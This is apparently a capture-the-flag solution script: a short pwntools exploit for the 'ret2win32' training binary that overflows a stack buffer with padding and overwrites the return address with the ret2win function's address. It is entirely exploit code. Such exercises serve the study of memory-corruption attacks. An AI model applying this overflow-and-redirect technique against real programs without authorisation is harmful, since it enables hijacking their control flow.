#!/usr/bin/python 
from pwn import *

p = process("./ret2win32")
elf = ELF("./ret2win32")
ret2win = elf.symbols['ret2win']

p.sendlineafter("> ", 'A'*(0x28+0x4) + p32(ret2win))

p.interactive()
